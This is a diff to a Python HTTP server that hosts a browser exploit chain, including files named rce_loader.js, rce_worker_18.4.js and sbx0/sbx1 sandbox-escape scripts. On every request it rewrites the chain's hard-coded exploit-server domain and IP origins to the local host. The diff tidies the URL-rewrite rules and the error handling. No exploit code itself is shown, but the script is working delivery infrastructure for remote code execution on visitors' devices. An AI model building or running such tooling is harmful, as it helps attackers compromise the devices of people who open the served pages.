@@ -15,27 +15,15 @@ BIND      = "0.0.0.0"
 LOCAL_IP  = ""   # auto-detected at startup
 
 # ─── Dynamic Patches ──────────────────────────────────────
-#
-# Strategy: target NAMED VARIABLES and STRUCTURAL PATTERNS rather than
-# matching arbitrary IPs/domains.  This makes every patch idempotent —
-# it works correctly whether the file on disk still contains the original
-# domain, a previously injected IP, or any other value, because we anchor
-# the regex to the surrounding JS syntax, not to a specific old value.
-#
-# Each tuple is (regex_pattern, replacement_template).
-# {IP} and {PORT} in the replacement are expanded at request time.
-#
 DYNAMIC_PATCHES = [
 
     # ── 1. rce_loader.js — localHost variable ─────────────────────────────
-    # Targets: var localHost = "http://anything"  (any prior value)
     (
         r'(var\s+localHost\s*=\s*)["\']https?://[^"\']*["\']',
         r'\g<1>"http://{IP}:{PORT}"',
     ),
 
     # ── 2. Any other top-level server-URL variable (future-proof) ─────────
-    # Covers:  var/let/const  serverHost / SERVER_HOST / serverUrl = "..."
     (
         r'((?:var|let|const)\s+(?:serverHost|SERVER_HOST|serverUrl|SERVER_URL)\s*=\s*)'
         r'["\']https?://[^"\']*["\']',
@@ -43,20 +31,26 @@ DYNAMIC_PATCHES = [
     ),
 
     # ── 3. logurlprefix bare variable declaration ──────────────────────────
-    # Workers declare this as a string that was once a full URL.
-    # Keep it empty — workers derive the actual host from data.desiredHost.
     (
         r'((?:var|let|const)\s+logurlprefix\s*=\s*)["\'][^"\']*["\']',
         r'\g<1>""',
     ),
 
-    # ── 4. Any remaining full exploit-server URL literal (belt-and-suspenders)
-    # Catches the ORIGINAL CDN domain OR any IP:PORT that was previously
-    # substituted.  Anchored to http:// so it will NEVER match raw memory
-    # addresses, hex values, or other numeric IPs in the exploit logic.
+    # ── 4a. CDN origin with /assets/ prefix → local origin, strip /assets/
     (
-        r'(?:https?://static\.cdncounter\.net(?:/[^\s"\']*)?'
-        r'|http://(?:\d{1,3}\.){3}\d{1,3}:\d+)',
+        r'https?://static\.cdncounter\.net/assets/',
+        r'http://{IP}:{PORT}/',
+    ),
+
+    # ── 4b. CDN origin (without /assets/ path, or bare domain) → local origin
+    (
+        r'https?://static\.cdncounter\.net(?=/|["\'\s?#]|$)',
+        r'http://{IP}:{PORT}',
+    ),
+
+    # ── 4c. Any remaining hard-coded IP:port origin → local origin
+    (
+        r'http://(?:\d{1,3}\.){3}\d{1,3}:\d+',
         r'http://{IP}:{PORT}',
     ),
 
@@ -73,12 +67,14 @@ DYNAMIC_PATCHES = [
     ),
 
     # ── 7. LOG() function guard — sbx0/sbx1 main scripts ─────────────────
-    # Prevents double-wrapping if the file has already been patched once.
     (
         r'function LOG\(msg\)\s*\{(?!\s*if\s*\(typeof)',
         r'function LOG(msg) { if(typeof print!=="undefined") print("sbx0: "+msg); return; ',
     ),
 ]
+
+# Extensions to patch (lowercase, compared case-insensitively)
+PATCH_EXTENSIONS = {".html", ".htm", ".js"}
 
 SYMLINKS = {"rce_worker_18.4.js": "rce_worker.js"}
 
@@ -104,14 +100,20 @@ def make_symlinks():
         else:
             print(f"  [!] Target missing for symlink: {target}")
 
-def apply_patches(content: str) -> tuple[str, int]:
+def apply_patches(content: str) -> "tuple[str, int]":
     """Apply all DYNAMIC_PATCHES and return (patched_content, total_substitutions)."""
+    global LOCAL_IP
     total = 0
     for pat, repl in DYNAMIC_PATCHES:
         repl_str = repl.replace("{IP}", LOCAL_IP).replace("{PORT}", str(PORT))
         content, n = re.subn(pat, repl_str, content)
         total += n
     return content, total
+
+def should_patch(path: str) -> bool:
+    """Return True if the filesystem path has a patchable extension (case-insensitive)."""
+    _, ext = os.path.splitext(path)          # FIX 1: use splitext, not endswith
+    return ext.lower() in PATCH_EXTENSIONS   # FIX 2: case-insensitive + .htm support
 
 # ─── Reusable TCP Server ───────────────────────────────────
 class ReusableTCPServer(socketserver.TCPServer):
@@ -122,56 +124,73 @@ class LoggingHandler(http.server.SimpleHTTPRequestHandler):
     log_file = None
 
     def send_head(self):
-        """Intercept GET requests to dynamically patch .html and .js files."""
+        """Intercept GET/HEAD requests to dynamically patch text files."""
         path = self.translate_path(self.path)
 
-        # Directory handling (redirect / serve index)
+        # ── Directory handling ────────────────────────────────────────────
         if os.path.isdir(path):
             parts = urllib.parse.urlsplit(self.path)
             if not parts.path.endswith("/"):
+                # Redirect to trailing-slash URL
                 self.send_response(301)
                 self.send_header("Location", self.path + "/")
+                self.send_header("Content-Length", "0")
                 self.end_headers()
                 return None
-            for index in ["index.html", "index.htm"]:
-                index_path = os.path.join(path, index)
-                if os.path.exists(index_path):
-                    path = index_path
+
+            # Look for an index file; update path if found
+            resolved = None
+            for index in ("index.html", "index.htm"):
+                candidate = os.path.join(path, index)
+                if os.path.exists(candidate):
+                    resolved = candidate
                     break
-            else:
+
+            if resolved is None:
+                # No index — fall back to parent (directory listing)
                 return super().send_head()
 
-        # Only patch text-based exploit files
-        if not path.endswith((".html", ".js")):
+            path = resolved   # FIX 3: carry resolved index path forward
+
+        # ── Non-patchable files → delegate to parent ──────────────────────
+        if not should_patch(path):              # FIX 1+2 applied here
             return super().send_head()
+
+        # ── Patchable file: open, patch, serve from memory ────────────────
+        if not os.path.isfile(path):
+            self.send_error(404, "File not found")
+            return None
 
         try:
             with open(path, "rb") as fd:
-                content = fd.read().decode("utf-8", errors="replace")
+                raw = fd.read()
+        except OSError as exc:
+            self.send_error(404, f"File not found: {exc}")
+            return None
 
+        try:
+            content = raw.decode("utf-8", errors="replace")
             patched, n_subs = apply_patches(content)
 
             if n_subs:
-                fname = os.path.basename(path)
-                print(f"  [patch] {fname}: {n_subs} substitution(s) applied")
+                print(f"  [patch] {os.path.basename(path)}: {n_subs} substitution(s) applied")
+            else:
+                print(f"  [serve] {os.path.basename(path)}: no patterns matched (served as-is)")
 
             body = patched.encode("utf-8")
-            f = io.BytesIO(body)
-
-            self.send_response(200)
-            self.send_header("Content-type", self.guess_type(path))
-            self.send_header("Content-Length", str(len(body)))
-            self.send_header("Last-Modified", self.date_time_string())
-            self.end_headers()
-            return f
-
-        except OSError:
-            self.send_error(404, "File not found")
+        except Exception as exc:                # FIX 4: keep error BEFORE headers are sent
+            print(f"\n[!] Patch error for {path}: {exc}")
+            self.send_error(500, "Internal patch error")
             return None
-        except Exception as e:
-            print(f"\n[!] Error processing {path}: {e}")
-            self.send_error(500, "Server Error")
-            return None
+
+        # All preparation succeeded — now commit to sending the response
+        f = io.BytesIO(body)
+        self.send_response(200)
+        self.send_header("Content-Type",   self.guess_type(path))
+        self.send_header("Content-Length", str(len(body)))
+        self.send_header("Last-Modified",  self.date_time_string())
+        self.end_headers()
+        return f
 
     def handle(self):
         try:
@@ -217,6 +236,7 @@ def main():
     # 2) Patch summary
     print(f"  [*] Dynamic patching active ({len(DYNAMIC_PATCHES)} rules)")
     print( "      Patches target named JS variables/fields — IP-agnostic.")
+    print(f"      Patched extensions: {', '.join(sorted(PATCH_EXTENSIONS))}")
     print()
 
     # 3) Symlinks
